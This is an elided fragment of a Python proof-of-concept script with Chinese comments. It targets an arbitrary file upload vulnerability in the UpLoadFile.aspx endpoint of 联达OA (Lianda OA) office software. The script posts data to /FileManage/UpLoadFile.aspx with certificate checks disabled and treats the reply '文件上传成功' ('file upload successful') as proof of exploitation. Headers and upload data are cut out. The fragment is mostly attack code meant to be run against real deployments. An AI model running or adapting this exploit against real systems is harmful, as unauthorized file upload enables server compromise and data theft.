...
def main():
    ...
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="联达OA UpLoadFile.aspx接口存在任意文件上传漏洞")
...
#定义poc
def poc(target):
    payload = '/FileManage/UpLoadFile.aspx'
    url = target+payload
    header = {
    ...
    #请求网页
    try:
        re = requests.get(url=target,headers=header,verify=False)
        if re.status_code == 200 : 
            res1 = requests.post(url=url,headers=header,data=data,verify=False)
            if res1.status_code == 200 and '文件上传成功' in res1.text:   
